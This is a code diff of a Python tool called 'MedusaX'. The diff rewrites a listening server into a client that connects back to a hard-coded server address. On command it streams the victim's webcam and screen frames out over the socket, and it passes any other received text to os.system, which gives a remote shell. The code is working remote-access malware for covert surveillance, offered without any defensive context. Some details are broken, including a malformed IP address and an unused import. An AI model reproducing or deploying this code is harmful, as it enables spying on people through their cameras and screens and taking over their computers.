@@ -1,99 +1,95 @@
 import socket
+import cv2
+import pyautogui
+import mss
 import threading
 import time
-from flask import Flask, render_template_string
-from colorama import Fore, init
-
-# Initialize colorama for colored output
-init(autoreset=True)
+import os
 
 # Global Variables
-streaming_html_location = "stream.html"  # Placeholder for where the HTML page will be stored
+server_ip = '10.01.33'  # Example, replace with the server's IP address
+server_port = 9999
 streaming_active = False
-server_socket = None
 client_socket = None
 
-# Flask application for displaying the live stream
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    # Load HTML template for stream
-    return render_template_string(open(streaming_html_location).read())
-
-# Function to handle streaming
-def start_streaming(stream_type):
+# Function to capture webcam feed and send to server
+def webcam_stream():
     global streaming_active
-    if streaming_active:
-        print(Fore.RED + "[!] Streaming is already active!")
+
+    # Start webcam capture
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        print("[!] Unable to access webcam")
         return
-    
-    print(Fore.GREEN + "[*] Starting...")
-    time.sleep(2)
-    print(Fore.GREEN + "[*] Preparing player...")
-    time.sleep(2)
-    print(Fore.GREEN + f"[*] Opening player at: http://127.0.0.1:5000/")
 
-    # Create the HTML page template for live streaming
-    html_content = f"""
-    <html>
-    <head><title>MedusaX {stream_type.capitalize()} Stream</title></head>
-    <body>
-        <h1>MedusaX {stream_type.capitalize()} Stream</h1>
-        <p>Target IP: {client_socket.getpeername()[0]}</p>
-        <p>Start Time: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())}</p>
-        <p>Status: {"Playing" if streaming_active else "Stopped"}</p>
-        <!-- Insert webcam/screen stream here -->
-        <video controls autoplay>
-            <source src="stream_source" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-    </body>
-    </html>
-    """
-    
-    with open(streaming_html_location, "w") as f:
-        f.write(html_content)
-    
-    streaming_active = True
-    print(Fore.GREEN + "[*] Streaming...")
+    print("[*] Starting webcam stream...")
+    while streaming_active:
+        ret, frame = cap.read()
+        if ret:
+            # Compress frame to reduce size
+            _, buffer = cv2.imencode('.jpg', frame)
+            data = buffer.tobytes()
 
-    # Start the Flask server to serve the stream
-    app.run(debug=False, use_reloader=False, port=5000)
+            # Send the frame data to server
+            client_socket.sendall(data)
+        time.sleep(0.1)  # Adjust to control stream speed
+    cap.release()
 
-def handle_client_connection(client):
-    global client_socket
-    client_socket = client
+# Function to capture screen and send to server
+def screen_stream():
+    global streaming_active
 
-    # Wait for commands from the client
+    # Start screen capture
+    with mss.mss() as sct:
+        print("[*] Starting screen stream...")
+        while streaming_active:
+            monitor = sct.monitors[1]  # Capture the first monitor
+            img = sct.grab(monitor)
+            img = mss.tools.to_png(img.rgb, img.size)
+
+            # Send the screen data to server
+            client_socket.sendall(img)
+            time.sleep(0.1)  # Adjust to control stream speed
+
+# Function to handle server commands
+def handle_commands():
+    global streaming_active
     while True:
-        command = client.recv(1024).decode('utf-8')
-        
-        if command.startswith('!webcam_stream') or command.startswith('!screen_stream'):
-            stream_type = 'webcam' if 'webcam' in command else 'screen'
-            start_streaming(stream_type)
+        command = client_socket.recv(1024).decode('utf-8')
+
+        if command.startswith('!webcam_stream'):
+            if not streaming_active:
+                streaming_active = True
+                threading.Thread(target=webcam_stream).start()
+            else:
+                print("[*] Webcam stream is already active.")
+        elif command.startswith('!screen_stream'):
+            if not streaming_active:
+                streaming_active = True
+                threading.Thread(target=screen_stream).start()
+            else:
+                print("[*] Screen stream is already active.")
         elif command.startswith('CTRL+P'):
-            print(Fore.YELLOW + "[*] Stopping stream...")
+            print("[*] Stopping stream...")
             streaming_active = False
-            return
+            break
         elif command.startswith("!"):
-            print(Fore.RED + "[!] Unknown command.")
+            print("[!] Unknown command.")
         else:
-            os.system(command)  # Execute shell command if not a valid MedusaX command
+            os.system(command)  # Execute shell command if not valid MedusaX command
 
-# Listening for incoming connections
-def server_listener():
-    global server_socket
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind(("0.0.0.0", 9999))  # Bind to any address and port 9999
-    server_socket.listen(1)
-    print(Fore.GREEN + "MedusaX Server is ready to accept connections.")
+# Function to connect to the server
+def connect_to_server():
+    global client_socket
+
+    # Create socket and connect to server
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((server_ip, server_port))
+    print("[*] Connected to MedusaX server.")
     
-    client, address = server_socket.accept()
-    print(Fore.GREEN + f"[*] Client connected: {address}")
-    handle_client_connection(client)
+    # Start listening for commands
+    handle_commands()
 
-# Start the server listener in a separate thread
+# Start client connection and command handling
 if __name__ == "__main__":
-    listener_thread = threading.Thread(target=server_listener)
-    listener_thread.start()
+    connect_to_server()
